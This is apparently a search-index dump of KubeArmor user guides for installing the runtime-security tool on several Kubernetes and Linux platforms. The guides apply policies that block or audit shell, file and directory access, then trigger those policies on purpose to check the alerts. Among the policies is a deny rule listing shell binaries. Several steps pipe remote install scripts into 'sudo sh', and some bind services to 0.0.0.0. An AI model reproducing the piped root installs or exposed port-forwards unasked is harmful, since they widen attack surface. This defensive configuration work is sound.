Kubernetes: ./install_microk8s.sh kubectl get all -A Step 2: Setup KubeArmor \u00b6 Install Karmor CLI: curl -sfL https://raw.githubusercontent.com/kubearmor/kubearmor-client/main/install.sh | sudo sh -s -- -b /usr/local/bin karmor install Karmor Verify: kubectl get pods -n kube-system | grep kubearmor Step 3: Create KubeArmor policy \u00b6 1. Create nginx deployment kubectl create deployment nginx --image nginx kubectl get pods --show-labels 2. Apply the following policy KubeArmor is an open source software that enables you to protect your cloud workload at run-time. To learn more about KubeArmor vi ksp-block-untrusted-shell-execution.yaml apiVersion : security.kubearmor.com/v1 kind : KubeArmorPolicy metadata : name : ksp-block-untrusted-shell-execution namespace : default # Change your namespace spec : tags : [ \"MITRE\" , \"D3fend\" , \"Execution\" , \"Unix Shell\" ] message : \"Bash shells have been accessed\" selector : matchLabels : app : nginx process : severity : 2 # Higher severity for processes matchPaths : - path : /bin/bash - path : /bin/sh - path : /usr/bin/bash - path : /usr/bin/env - path : /usr/bin/shell - path : /bin/ksh - path : /etc/init.d - path : /dev/tty - path : /bin/zsh - path : /bin/tcsh - path : /bin/csh action : Block file : severity : 10 # lowest severity for processes invoked as child process of bash matchPaths : - path : /bin/bash - path : /bin/sh - path : /usr/bin/bash - path : /usr/bin/env - path : /usr/bin/shell - path : /bin/ksh - path : /etc/init.d - path : /dev/tty - path : /bin/zsh - path : /bin/tcsh - path : /bin/csh fromSource : - path : /bin/bash action : Audit 3. Apply the policy kubectl apply -f ksp-block-untrusted-shell-execution.yaml Note: Policy will work based on matched labels Ex:(app: nginx) kubectl get pods 4. Violating the policy kubectl exec -it <Pod Name> -- bash 5. run sh, env commands for policy violation Note: Kubearmor is working, we can't run the commands, which we have blocked in the policy.. Step 4: Getting Alerts/Telemetry from KubeArmor \u00b6 1. Kubearmor SVC port forward to Monitor the logs kubectl port-forward -n kube-system svc/kubearmor --address 0 .0.0.0 --address :: 32767 :32767 2. Verifying policy Violation logs karmor log","title":"MicroK8's Cluster"},{"location":"open-source/kubearmor/microk8s/#overview","text":"This user journey guides you to install and verify the compatibility of Kuberarmor on MicroK8's by applying policies on Kubernetes workloads.","title":"Overview"},{"location":"open-source/kubearmor/microk8s/#step-1-setup-microk8s","text":"Clone the Repository: git clone https://github.com/kubearmor/KubeArmor.git cd KubeArmor/contribution/microk8s Run the script to set up MicroK8's Kubernetes: ./install_microk8s.sh kubectl get all -A","title":"Step 1: Setup MicroK8's"},{"location":"open-source/kubearmor/microk8s/#step-2-setup-kubearmor","text":"Install Karmor CLI: curl -sfL https://raw.githubusercontent.com/kubearmor/kubearmor-client/main/install.sh | sudo sh -s -- -b /usr/local/bin karmor install Karmor Verify: kubectl get pods -n kube-system | grep kubearmor","title":"Step 2: Setup KubeArmor"},{"location":"open-source/kubearmor/microk8s/#step-3-create-kubearmor-policy","text":"1. Create nginx deployment kubectl create deployment nginx --image nginx kubectl get pods --show-labels 2. Apply the following policy KubeArmor is an open source software that enables you to protect your cloud workload at run-time. To learn more about KubeArmor vi ksp-block-untrusted-shell-execution.yaml apiVersion : security.kubearmor.com/v1 kind : KubeArmorPolicy metadata : name : ksp-block-untrusted-shell-execution namespace : default # Change your namespace spec : tags : [ \"MITRE\" , \"D3fend\" , \"Execution\" , \"Unix Shell\" ] message : \"Bash shells have been accessed\" selector : matchLabels : app : nginx process : severity : 2 # Higher severity for processes matchPaths : - path : /bin/bash - path : /bin/sh - path : /usr/bin/bash - path : /usr/bin/env - path : /usr/bin/shell - path : /bin/ksh - path : /etc/init.d - path : /dev/tty - path : /bin/zsh - path : /bin/tcsh - path : /bin/csh action : Block file : severity : 10 # lowest severity for processes invoked as child process of bash matchPaths : - path : /bin/bash - path : /bin/sh - path : /usr/bin/bash - path : /usr/bin/env - path : /usr/bin/shell - path : /bin/ksh - path : /etc/init.d - path : /dev/tty - path : /bin/zsh - path : /bin/tcsh - path : /bin/csh fromSource : - path : /bin/bash action : Audit 3. Apply the policy kubectl apply -f ksp-block-untrusted-shell-execution.yaml Note: Policy will work based on matched labels Ex:(app: nginx) kubectl get pods 4. Violating the policy kubectl exec -it <Pod Name> -- bash 5. run sh, env commands for policy violation Note: Kubearmor is working, we can't run the commands, which we have blocked in the policy..","title":"Step 3: Create KubeArmor policy"},{"location":"open-source/kubearmor/microk8s/#step-4-getting-alertstelemetry-from-kubearmor","text":"1. Kubearmor SVC port forward to Monitor the logs kubectl port-forward -n kube-system svc/kubearmor --address 0 .0.0.0 --address :: 32767 :32767 2. Verifying policy Violation logs karmor log","title":"Step 4:  Getting Alerts/Telemetry from KubeArmor"},{"location":"open-source/kubearmor/minikube/","text":"Overview \u00b6 This user journey guides you to install and verify the compatibility of Kuberarmor on Minikube by applying policies on Kubernetes workloads. Step 1: Clone the Repository \u00b6 git clone https://github.com/kubearmor/KubeArmor.git Step 2: Install VirtualBox \u00b6 cd KubeArmor/contribution/minikube ./install_virtualbox.sh Note: Once VirtualBox installed, reboot the system. sudo reboot Step 3: Install Minikube \u00b6 cd KubeArmor/contribution/minikube ./install_minikube.sh ./start_minikube.sh Step 4: Karmor Install \u00b6 Install Karmor CLI: curl -sfL https://raw.githubusercontent.com/kubearmor/kubearmor-client/main/install.sh | sudo sh -s -- -b /usr/local/bin karmor install Karmor Verify: karmor version kubectl get pods -n kube-system | grep kubearmor Step 5: KubeArmor Policy \u00b6 1. Creating sample ubuntu deployment kubectl apply -f ubuntu.yaml kubectl get pods --show-labels 2. Apply the following policy *use label of the deployment cat ksp-block-sting-rhel-v-230335.yaml apiVersion : security.kubearmor.com/v1 kind : KubeArmorPolicy metadata : name : ksp-block-stig-rhel-v-230335 namespace : default # Change your namespace spec : tags : [ \"STIG\" , \"RHEL\" ] message : \"Alert! /home/test.txt access will be Audit\" selector : matchLabels : app : ubuntu # Change your matchLabels file : severity : 5 matchPaths : - path : /home/test.txt action : Block 3. Apply the policy kubectl apply -f ksp-block-sting-rhel-v-230335.yaml 4. Violating the policy kubectl exec -it ubuntu-deployment-746964c6c6-j67jv bash Step 6: Getting Alerts/Telemetry from KubeArmor \u00b6 1. KubeArmor SVC port forward to Monitor the logs kubectl port-forward -n kube-system svc/kubearmor 32767 :32767 2. Verifying policy Violation logs Karmor log","title":"Minikube Cluster"},{"location":"open-source/kubearmor/minikube/#overview","text":"This user journey guides you to install and verify the compatibility of Kuberarmor on Minikube by applying policies on Kubernetes workloads.","title":"Overview"},{"location":"open-source/kubearmor/minikube/#step-1-clone-the-repository","text":"git clone https://github.com/kubearmor/KubeArmor.git","title":"Step 1: Clone the Repository"},{"location":"open-source/kubearmor/minikube/#step-2-install-virtualbox","text":"cd KubeArmor/contribution/minikube ./install_virtualbox.sh Note: Once VirtualBox installed, reboot the system. sudo reboot","title":"Step 2: Install VirtualBox"},{"location":"open-source/kubearmor/minikube/#step-3-install-minikube","text":"cd KubeArmor/contribution/minikube ./install_minikube.sh ./start_minikube.sh","title":"Step 3: Install Minikube"},{"location":"open-source/kubearmor/minikube/#step-4-karmor-install","text":"Install Karmor CLI: curl -sfL https://raw.githubusercontent.com/kubearmor/kubearmor-client/main/install.sh | sudo sh -s -- -b /usr/local/bin karmor install Karmor Verify: karmor version kubectl get pods -n kube-system | grep kubearmor","title":"Step 4: Karmor Install"},{"location":"open-source/kubearmor/minikube/#step-5-kubearmor-policy","text":"1. Creating sample ubuntu deployment kubectl apply -f ubuntu.yaml kubectl get pods --show-labels 2. Apply the following policy *use label of the deployment cat ksp-block-sting-rhel-v-230335.yaml apiVersion : security.kubearmor.com/v1 kind : KubeArmorPolicy metadata : name : ksp-block-stig-rhel-v-230335 namespace : default # Change your namespace spec : tags : [ \"STIG\" , \"RHEL\" ] message : \"Alert! /home/test.txt access will be Audit\" selector : matchLabels : app : ubuntu # Change your matchLabels file : severity : 5 matchPaths : - path : /home/test.txt action : Block 3. Apply the policy kubectl apply -f ksp-block-sting-rhel-v-230335.yaml 4. Violating the policy kubectl exec -it ubuntu-deployment-746964c6c6-j67jv bash","title":"Step 5: KubeArmor Policy"},{"location":"open-source/kubearmor/minikube/#step-6-getting-alertstelemetry-from-kubearmor","text":"1. KubeArmor SVC port forward to Monitor the logs kubectl port-forward -n kube-system svc/kubearmor 32767 :32767 2. Verifying policy Violation logs Karmor log","title":"Step 6: Getting Alerts/Telemetry from KubeArmor"},{"location":"open-source/kubearmor/suse_les_15/","text":"Overview \u00b6 This user journey guides you to install and verify the compatibility of Kuberarmor on SUSE Linux Enterprise Server 15 with 5.3 Kernel Version by applying policies on VM workloads. Step 1: Install Kubearmor on VM \u00b6 Install pre-requisites: sudo zypper ref sudo zypper in bcc-tools bcc-examples fullkver = $( zypper se -s kernel-default-devel | awk '{split($0,a,\"|\"); print a[4]}' | grep $( uname -r | awk '{gsub(\"-default\", \"\");print}' ) | sed -e 's/^[ \\t]*//' | tail -n 1 ) zypper -n --config /var/opt/carbonblack/response/zypp.conf install -f -y kernel-default-devel = \" $fullkver \" zypper in apparmor-utils zypper in apparmor-profiles systemctl restart apparmor.service Download the Latest release of KubeArmor wget https://github.com/kubearmor/KubeArmor/releases/download/v0.3.1/kubearmor_0.3.1_linux-amd64.rpm zypper install kubearmor_0.3.1_linux-amd64.rpm Start & Check the status of Kubearmor: sudo systemctl start kubearmor sudo systemctl enable kubearmor sudo systemctl status kubearmor Step 2: Apply and Verify Kubearmor system policy \u00b6 cat khp-example-vmname.yaml apiVersion : security.kubearmor.com/v1 kind : KubeArmorHostPolicy metadata : name : khp-02 spec : severity : 5 file : matchPaths : - path : /proc/cpuinfo action : Block Run this command to apply the policy: karmor vm policy add khp-example-vmname.yaml Step 3: Policy Violation \u00b6 With the above mentioned policy enforced in the VM, if a user tries to access /proc/cpuinfo file, user will see permission denied error and karmor log will show the alert log for blocking the file access as shown below. cat /proc/cpuinfo Verifying policy Violation logs: karmor log","title":"SUSE Linux Enterprise Server 15"},{"location":"open-source/kubearmor/suse_les_15/#overview","text":"This user journey guides you to install and verify the compatibility of Kuberarmor on SUSE Linux Enterprise Server 15 with 5.3 Kernel Version by applying policies on VM workloads.","title":"Overview"},{"location":"open-source/kubearmor/suse_les_15/#step-1-install-kubearmor-on-vm","text":"Install pre-requisites: sudo zypper ref sudo zypper in bcc-tools bcc-examples fullkver = $( zypper se -s kernel-default-devel | awk '{split($0,a,\"|\"); print a[4]}' | grep $( uname -r | awk '{gsub(\"-default\", \"\");print}' ) | sed -e 's/^[ \\t]*//' | tail -n 1 ) zypper -n --config /var/opt/carbonblack/response/zypp.conf install -f -y kernel-default-devel = \" $fullkver \" zypper in apparmor-utils zypper in apparmor-profiles systemctl restart apparmor.service Download the Latest release of KubeArmor wget https://github.com/kubearmor/KubeArmor/releases/download/v0.3.1/kubearmor_0.3.1_linux-amd64.rpm zypper install kubearmor_0.3.1_linux-amd64.rpm Start & Check the status of Kubearmor: sudo systemctl start kubearmor sudo systemctl enable kubearmor sudo systemctl status kubearmor","title":"Step 1: Install Kubearmor on VM"},{"location":"open-source/kubearmor/suse_les_15/#step-2-apply-and-verify-kubearmor-system-policy","text":"cat khp-example-vmname.yaml apiVersion : security.kubearmor.com/v1 kind : KubeArmorHostPolicy metadata : name : khp-02 spec : severity : 5 file : matchPaths : - path : /proc/cpuinfo action : Block Run this command to apply the policy: karmor vm policy add khp-example-vmname.yaml","title":"Step 2: Apply and Verify Kubearmor system policy"},{"location":"open-source/kubearmor/suse_les_15/#step-3-policy-violation","text":"With the above mentioned policy enforced in the VM, if a user tries to access /proc/cpuinfo file, user will see permission denied error and karmor log will show the alert log for blocking the file access as shown below. cat /proc/cpuinfo Verifying policy Violation logs: karmor log","title":"Step 3: Policy Violation"},{"location":"open-source/kubearmor/ubuntu18.04/","text":"Overview \u00b6 This user journey guides you to install and verify the compatibility of Kuberarmor on Ubuntu 18.04 with 5.4 Kernel Version by applying policies on VM workloads. Step 1: Install Kubearmor on VM \u00b6 Install pre-requisites: sudo apt-key adv --keyserver keyserver.ubuntu.com --recv-keys 4052245BD4284CDD echo \"deb https://repo.iovisor.org/apt/ $( lsb_release -cs ) $( lsb_release -cs ) main\" | sudo tee /etc/apt/sources.list.d/iovisor.list sudo apt-get update sudo apt-get install bcc-tools libbcc-examples linux-headers- $( uname -r ) sudo apt install bpfcc-tools linux-headers- $( uname -r ) sudo apt-get install linux-headers-generic sudo apt --fix-broken install sudo apt-get update Download & Install the Latest release of KubeArmor wget https://github.com/kubearmor/KubeArmor/releases/download/v0.3.1/kubearmor_0.3.1_linux-amd64.deb && sudo dpkg -i kubearmor_0.3.1_linux-amd64.deb Start and Check the status of Kubearmor: sudo systemctl start kubearmor sudo systemctl enable kubearmor sudo systemctl status kubearmor Step 2: Apply and Verify KubeArmor system policy \u00b6 vim sleepdenypolicy.yaml apiVersion : security.kubearmor.com/v1 kind : KubeArmorHostPolicy metadata : name : hsp-kubearmor-dev-proc-path-block spec : process : matchPaths : - path : bin/sleep # try sleep 1 action : Block Run this command to apply the policy: karmor vm --kvms policy add sleepdenypolicy.yaml Note: With the above mentioned policy enforced in master VM, if a user tries to access sleep command, user will see permission denied error and karmor log will show the alert log for blocking the file access. Step 3: Policy Violation \u00b6 sleep 2 Verifying policy Violation logs: karmor log Deleting the applied policy: karmor vm --kvms policy delete sleepdenypolicy.yaml","title":"Ubuntu 18.04"},{"location":"open-source/kubearmor/ubuntu18.04/#overview","text":"This user journey guides you to install and verify the compatibility of Kuberarmor on Ubuntu 18.04 with 5.4 Kernel Version by applying policies on VM workloads.","title":"Overview"},{"location":"open-source/kubearmor/ubuntu18.04/#step-1-install-kubearmor-on-vm","text":"Install pre-requisites: sudo apt-key adv --keyserver keyserver.ubuntu.com --recv-keys 4052245BD4284CDD echo \"deb https://repo.iovisor.org/apt/ $( lsb_release -cs ) $( lsb_release -cs ) main\" | sudo tee /etc/apt/sources.list.d/iovisor.list sudo apt-get update sudo apt-get install bcc-tools libbcc-examples linux-headers- $( uname -r ) sudo apt install bpfcc-tools linux-headers- $( uname -r ) sudo apt-get install linux-headers-generic sudo apt --fix-broken install sudo apt-get update Download & Install the Latest release of KubeArmor wget https://github.com/kubearmor/KubeArmor/releases/download/v0.3.1/kubearmor_0.3.1_linux-amd64.deb && sudo dpkg -i kubearmor_0.3.1_linux-amd64.deb Start and Check the status of Kubearmor: sudo systemctl start kubearmor sudo systemctl enable kubearmor sudo systemctl status kubearmor","title":"Step 1: Install Kubearmor on VM"},{"location":"open-source/kubearmor/ubuntu18.04/#step-2-apply-and-verify-kubearmor-system-policy","text":"vim sleepdenypolicy.yaml apiVersion : security.kubearmor.com/v1 kind : KubeArmorHostPolicy metadata : name : hsp-kubearmor-dev-proc-path-block spec : process : matchPaths : - path : bin/sleep # try sleep 1 action : Block Run this command to apply the policy: karmor vm --kvms policy add sleepdenypolicy.yaml Note: With the above mentioned policy enforced in master VM, if a user tries to access sleep command, user will see permission denied error and karmor log will show the alert log for blocking the file access.","title":"Step 2: Apply and Verify KubeArmor system policy"},{"location":"open-source/kubearmor/ubuntu18.04/#step-3-policy-violation","text":"sleep 2 Verifying policy Violation logs: karmor log Deleting the applied policy: karmor vm --kvms policy delete sleepdenypolicy.yaml","title":"Step 3: Policy Violation"},{"location":"open-source/kubearmor/ubuntu20.04/","text":"Overview \u00b6 This user journey guides you to install and verify the compatibility of Kuberarmor on Ubuntu 20.04 with 5.13 Kernel Version by applying policies on VM workloads. Step 1: Install Kubearmor on VM \u00b6 Install pre-requisites: \u00b6 sudo apt update && sudo apt upgrade sudo apt install make llvm clang libelf-dev linux-headers-generic sudo apt install bpfcc-tools linux-headers- $( uname -r ) For bpftool install any of the packages for system environment: \u00b6 sudo apt install linux-intel-iotg-5.15-tools-common sudo apt install linux-oem-5.6-tools-common sudo apt install linux-tools-common sudo apt install linux-iot-tools-common sudo apt install linux-tools-gcp sudo apt install linux-cloud-tools-gcp To install KubeArmor: \u00b6 Note: Copy this whole below command and run it in your terminal. curl -s https://api.github.com/repos/kubearmor/KubeArmor/releases/latest \\ | grep \"browser_download_url.*deb\" \\ | cut -d : -f 2 ,3 \\ | tr -d \\\" \\ | wget -qi - sudo dpkg -i kubearmor_*_linux-amd64.deb If above error occurs, Run: \u00b6 sudo apt --fix-broken install Start and Check the status of Kubearmor: \u00b6 sudo systemctl start kubearmor sudo systemctl enable kubearmor sudo systemctl status kubearmor Step 2: Apply and Verify Kubearmor system policy \u00b6 cat khp-example-vmname.yaml apiVersion : security.kubearmor.com/v1 kind : KubeArmorHostPolicy metadata : name : khp-02 spec : severity : 5 file : matchPaths : - path : /proc/cpuinfo action : Block karmor vm --kvms policy add khp-example-vmname.yaml Output: success Note: With the above mentioned policy enforced in the VM, if a user tries to access /proc/cpuinfo file, user will see permission denied error and karmor log will show the alert log for blocking the file access. Step 3: Violating the policy \u00b6 cat /proc/cpuinfo Verifying policy Violation logs: curl -sfL https://raw.githubusercontent.com/kubearmor/kubearmor-client/main/install.sh | sudo sh -s -- -b /usr/local/bin karmor log","title":"Ubuntu 20.04"},{"location":"open-source/kubearmor/ubuntu20.04/#overview","text":"This user journey guides you to install and verify the compatibility of Kuberarmor on Ubuntu 20.04 with 5.13 Kernel Version by applying policies on VM workloads.","title":"Overview"},{"location":"open-source/kubearmor/ubuntu20.04/#step-1-install-kubearmor-on-vm","text":"","title":"Step 1: Install Kubearmor on VM"},{"location":"open-source/kubearmor/ubuntu20.04/#install-pre-requisites","text":"sudo apt update && sudo apt upgrade sudo apt install make llvm clang libelf-dev linux-headers-generic sudo apt install bpfcc-tools linux-headers- $( uname -r )","title":"Install pre-requisites:"},{"location":"open-source/kubearmor/ubuntu20.04/#for-bpftool-install-any-of-the-packages-for-system-environment","text":"sudo apt install linux-intel-iotg-5.15-tools-common sudo apt install linux-oem-5.6-tools-common sudo apt install linux-tools-common sudo apt install linux-iot-tools-common sudo apt install linux-tools-gcp sudo apt install linux-cloud-tools-gcp","title":"For bpftool install any of the packages for system environment:"},{"location":"open-source/kubearmor/ubuntu20.04/#to-install-kubearmor","text":"Note: Copy this whole below command and run it in your terminal. curl -s https://api.github.com/repos/kubearmor/KubeArmor/releases/latest \\ | grep \"browser_download_url.*deb\" \\ | cut -d : -f 2 ,3 \\ | tr -d \\\" \\ | wget -qi - sudo dpkg -i kubearmor_*_linux-amd64.deb","title":"To install KubeArmor:"},{"location":"open-source/kubearmor/ubuntu20.04/#if-above-error-occurs-run","text":"sudo apt --fix-broken install","title":"If above error occurs, Run:"},{"location":"open-source/kubearmor/ubuntu20.04/#start-and-check-the-status-of-kubearmor","text":"sudo systemctl start kubearmor sudo systemctl enable kubearmor sudo systemctl status kubearmor","title":"Start and Check the status of Kubearmor:"},{"location":"open-source/kubearmor/ubuntu20.04/#step-2-apply-and-verify-kubearmor-system-policy","text":"cat khp-example-vmname.yaml apiVersion : security.kubearmor.com/v1 kind : KubeArmorHostPolicy metadata : name : khp-02 spec : severity : 5 file : matchPaths : - path : /proc/cpuinfo action : Block karmor vm --kvms policy add khp-example-vmname.yaml Output: success Note: With the above mentioned policy enforced in the VM, if a user tries to access /proc/cpuinfo file, user will see permission denied error and karmor log will show the alert log for blocking the file access.","title":"Step 2: Apply and Verify Kubearmor system policy"},{"location":"open-source/kubearmor/ubuntu20.04/#step-3-violating-the-policy","text":"cat /proc/cpuinfo Verifying policy Violation logs: curl -sfL https://raw.githubusercontent.com/kubearmor/kubearmor-client/main/install.sh | sudo sh -s -- -b /usr/local/bin karmor log","title":"Step 3: Violating the policy"},{"location":"open-source/kubearmor/al2/al2/","text":"Overview \u00b6 This user journey guides you to install and verify the compatibility of Kuberarmor on Amazon Linux 2 Os with 5.10 Kernel Version by applying policies on VM workloads. Note: As of now KubeArmor for Amazon Linux 2 will only Support for Audit mode. In the upcoming updates it will also support Enforcements, such as Allow and Block. Step 1: Install KubeArmor and Karmor CLI on VM \u00b6 Download the Latest release of KubeArmor wget https://github.com/kubearmor/KubeArmor/releases/download/v0.3.1/kubearmor_0.3.1_linux-amd64.rpm yum install kubearmor_0.3.1_linux-amd64.rpm Start and Check the status of KubeArmor: systemctl start kubearmor systemctl enable kubearmor systemctl status kubearmor Install Karmor CLI: curl -sfL https://raw.githubusercontent.com/kubearmor/kubearmor-client/main/install.sh | sudo sh -s -- -b /usr/bin karmor version Step 2: Apply and Violating KubeArmor System Policy \u00b6 1. Process Level \u00b6 cat propolicy.yaml apiVersion : security.kubearmor.com/v1 kind : KubeArmorHostPolicy metadata : name : kubearmor-pro-policy spec : process : matchPaths : - path : /usr/bin/whoami - path : /usr/bin/id - path : /usr/bin/cp - path : /usr/bin/rm action : Audit Run this command to apply the policy: karmor vm policy add propolicy.yaml Violating the policy: cp test1.txt test2.txt Verifying policy Violation logs: karmor log 2. File Level \u00b6 cat filepolicy.yaml apiVersion : security.kubearmor.com/v1 kind : KubeArmorHostPolicy metadata : name : kubearmor-file-policy spec : file : matchPaths : - path : /etc/fstab action : Audit Run this command to apply the policy: karmor vm policy add filepolicy.yaml Violating the policy: cat /etc/fstab Verifying policy Violation logs: karmor log 3. Directory Level \u00b6 cat dirpolicy.yaml apiVersion : security.kubearmor.com/v1 kind : KubeArmorPolicy metadata : name : kubearmor-dir-policy spec : file : matchDirectories : - dir : /var/log/tomcat recursive : true action : Audit Run this command to apply the policy: karmor vm policy add dirpolicy.yaml Violating the policy: cat /var/log/tomcat/catalina.out Verifying policy Violation logs: karmor log For Log Based Alerts \u00b6 You can visit our Enterprise version","title":"Amazon Linux 2"},{"location":"open-source/kubearmor/al2/al2/#overview","text":"This user journey guides you to install and verify the compatibility of Kuberarmor on Amazon Linux 2 Os with 5.10 Kernel Version by applying policies on VM workloads. Note: As of now KubeArmor for Amazon Linux 2 will only Support for Audit mode. In the upcoming updates it will also support Enforcements, such as Allow and Block.","title":"Overview"},{"location":"open-source/kubearmor/al2/al2/#step-1-install-kubearmor-and-karmor-cli-on-vm","text":"Download the Latest release of KubeArmor wget https://github.com/kubearmor/KubeArmor/releases/download/v0.3.1/kubearmor_0.3.1_linux-amd64.rpm yum install kubearmor_0.3.1_linux-amd64.rpm Start and Check the status of KubeArmor: systemctl start kubearmor systemctl enable kubearmor systemctl status kubearmor Install Karmor CLI: curl -sfL https://raw.githubusercontent.com/kubearmor/kubearmor-client/main/install.sh | sudo sh -s -- -b /usr/bin karmor version","title":"Step 1: Install KubeArmor and Karmor CLI on VM"},{"location":"open-source/kubearmor/al2/al2/#step-2-apply-and-violating-kubearmor-system-policy","text":"","title":"Step 2: Apply and Violating KubeArmor System Policy"},{"location":"open-source/kubearmor/al2/al2/#1-process-level","text":"cat propolicy.yaml apiVersion : security.kubearmor.com/v1 kind : KubeArmorHostPolicy metadata : name : kubearmor-pro-policy spec : process : matchPaths : - path : /usr/bin/whoami - path : /usr/bin/id - path : /usr/bin/cp - path : /usr/bin/rm action : Audit Run this command to apply the policy: karmor vm policy add propolicy.yaml Violating the policy: cp test1.txt test2.txt Verifying policy Violation logs: karmor log","title":"1. Process Level"},{"location":"open-source/kubearmor/al2/al2/#2-file-level","text":"cat filepolicy.yaml apiVersion : security.kubearmor.com/v1 kind : KubeArmorHostPolicy metadata : name : kubearmor-file-policy spec : file : matchPaths : - path : /etc/fstab action : Audit Run this command to apply the policy: karmor vm policy add filepolicy.yaml Violating the policy: cat /etc/fstab Verifying policy Violation logs: karmor log","title":"2. File Level"},{"location":"open-source/kubearmor/al2/al2/#3-directory-level","text":"cat dirpolicy.yaml apiVersion : security.kubearmor.com/v1 kind : KubeArmorPolicy metadata : name : kubearmor-dir-policy spec : file : matchDirectories : - dir : /var/log/tomcat recursive : true action : Audit Run this command to apply the policy: karmor vm policy add dirpolicy.yaml Violating the policy: cat /var/log/tomcat/catalina.out Verifying policy Violation logs: karmor log","title":"3. Directory Level"},{"location":"open-source/kubearmor/al2/al2/#for-log-based-alerts","text":"You can visit our Enterprise version","title":"For Log Based Alerts"},{"location":"open-source/kubearmor/eks_al2/eks_al2/","text":"Overview \u00b6 This user journey guides you to install and verify the compatibility of Kuberarmor on EKS Amazon Linux 2 by applying policies on Kubernetes workloads. Note: As of now KubeArmor for EKS Amazon Linux 2 will only Support for Audit mode. In the upcoming updates it will also support Enforcements, such as Allow and Block. Step 1: Create a EKS-Cluster using AWS Console \u00b6 Once the nodegroup is created, Install EKS CTL , AWS CLI , Helm tools aws configure eksctl get cluster aws eks --region us-west-1 update-kubeconfig --name eks-amazon-kubearmor kubectl get nodes kubectl get svc Step 2: Karmor Install \u00b6 Install Karmor CLI: curl -sfL https://raw.githubusercontent.com/kubearmor/kubearmor-client/main/install.sh | sudo sh -s -- -b /usr/local/bin karmor install karmor version Karmor Verify: kubectl get pods -n kube-system | grep kubearmor Step 3: Kubearmor Policy on Process Level \u00b6 1. Create a nginx deployment kubectl create deployment nginx --image nginx kubectl get pods --show-labels 2. Explore the Policy cat nginx-kubearmor-policy.yaml apiVersion : security.kubearmor.com/v1 kind : KubeArmorPolicy metadata : name : nginx-kubearmor-policy # namespace: accuknox-agents # Change your namespace spec : selector : matchLabels : app : nginx # use your own label here process : severity : 3 matchPaths : - path : /usr/bin/touch - path : /bin/rm - path : /bin/chmod - path : /usr/sbin/nginx action : Audit 3. Apply the Policy kubectl apply -f nginx-kubearmor-policy.yaml kubectl get kubeArmorPolicy Note: Policy will work based on matched labels. Ex: (app: nginx) 4. Violating the Policy kubectl exec -it nginx-6799fc88d8-qdnfq -- bash 5. Kubearmor SVC port forward to Monitor the logs kubectl port-forward -n kube-system svc/kubearmor --address 0 .0.0.0 --address :: 32767 :32767 6. Verifying policy Violation logs karmor log Step 4: Kubearmor Policy on File Level \u00b6 1. Explore the policy cat nginx-kubearmor-policy.yaml apiVersion : security.kubearmor.com/v1 kind : KubeArmorPolicy metadata : name : nginx-kubearmor-policy # namespace: accuknox-agents # Change your namespace spec : selector : matchLabels : app : nginx # use your own label here file : severity : 3 matchPaths : - path : /etc/fstab action : Audit 2. Apply the policy kubectl apply -f nginx-kubearmor-policy.yaml Note: Policy will work based on matched labels. Ex: (app: nginx) 3. Violating the policy kubectl exec -it nginx-6799fc88d8-qdnfq -- bash 4. Kubearmor SVC port forward to Monitor the logs kubectl port-forward -n kube-system svc/kubearmor --address 0 .0.0.0 --address :: 32767 :32767 5. Verify the policy violation log karmor log Step 5: Kubearmor Policy on Directory level \u00b6 1. Explore the policy cat nginx-kubearmor-policy.yaml apiVersion : security.kubearmor.com/v1 kind : KubeArmorPolicy metadata : name : nginx-kubearmor-policy # namespace: accuknox-agents # Change your namespace spec : selector : matchLabels : app : nginx # use your own label here file : severity : 3 matchDirectories : - dir : /boot/ recursive : true action : Audit 2. Apply the policy kubectl apply -f nginx-kubearmor-policy.yaml Note: Policy will work based on matched labels. Ex: (app: tomcat) 3. Violating the policy kubectl exec -it nginx-6799fc88d8-qdnfq -- bash 4. Kubearmor SVC port forward to Monitor the logs kubectl port-forward -n kube-system svc/kubearmor --address 0 .0.0.0 --address :: 32767 :32767 5. Verify policy violation log karmor log For Log Based Alerts \u00b6 You can visit our Enterprise version","title":"EKS Amazon Linux 2"},{"location":"open-source/kubearmor/eks_al2/eks_al2/#overview","text":"This user journey guides you to install and verify the compatibility of Kuberarmor on EKS Amazon Linux 2 by applying policies on Kubernetes workloads. Note: As of now KubeArmor for EKS Amazon Linux 2 will only Support for Audit mode. In the upcoming updates it will also support Enforcements, such as Allow and Block.","title":"Overview"},{"location":"open-source/kubearmor/eks_al2/eks_al2/#step-1-create-a-eks-cluster-using-aws-console","text":"Once the nodegroup is created, Install EKS CTL , AWS CLI , Helm tools aws configure eksctl get cluster aws eks --region us-west-1 update-kubeconfig --name eks-amazon-kubearmor kubectl get nodes kubectl get svc","title":"Step 1: Create a EKS-Cluster using AWS Console"},{"location":"open-source/kubearmor/eks_al2/eks_al2/#step-2-karmor-install","text":"Install Karmor CLI: curl -sfL https://raw.githubusercontent.com/kubearmor/kubearmor-client/main/install.sh | sudo sh -s -- -b /usr/local/bin karmor install karmor version Karmor Verify: kubectl get pods -n kube-system | grep kubearmor","title":"Step 2: Karmor Install"},{"location":"open-source/kubearmor/eks_al2/eks_al2/#step-3-kubearmor-policy-on-process-level","text":"1. Create a nginx deployment kubectl create deployment nginx --image nginx kubectl get pods --show-labels 2. Explore the Policy cat nginx-kubearmor-policy.yaml apiVersion : security.kubearmor.com/v1 kind : KubeArmorPolicy metadata : name : nginx-kubearmor-policy # namespace: accuknox-agents # Change your namespace spec : selector : matchLabels : app : nginx # use your own label here process : severity : 3 matchPaths : - path : /usr/bin/touch - path : /bin/rm - path : /bin/chmod - path : /usr/sbin/nginx action : Audit 3. Apply the Policy kubectl apply -f nginx-kubearmor-policy.yaml kubectl get kubeArmorPolicy Note: Policy will work based on matched labels. Ex: (app: nginx) 4. Violating the Policy kubectl exec -it nginx-6799fc88d8-qdnfq -- bash 5. Kubearmor SVC port forward to Monitor the logs kubectl port-forward -n kube-system svc/kubearmor --address 0 .0.0.0 --address :: 32767 :32767 6. Verifying policy Violation logs karmor log","title":"Step 3: Kubearmor Policy on Process Level"},{"location":"open-source/kubearmor/eks_al2/eks_al2/#step-4-kubearmor-policy-on-file-level","text":"1. Explore the policy cat nginx-kubearmor-policy.yaml apiVersion : security.kubearmor.com/v1 kind : KubeArmorPolicy metadata : name : nginx-kubearmor-policy # namespace: accuknox-agents # Change your namespace spec : selector : matchLabels : app : nginx # use your own label here file : severity : 3 matchPaths : - path : /etc/fstab action : Audit 2. Apply the policy kubectl apply -f nginx-kubearmor-policy.yaml Note: Policy will work based on matched labels. Ex: (app: nginx) 3. Violating the policy kubectl exec -it nginx-6799fc88d8-qdnfq -- bash 4. Kubearmor SVC port forward to Monitor the logs kubectl port-forward -n kube-system svc/kubearmor --address 0 .0.0.0 --address :: 32767 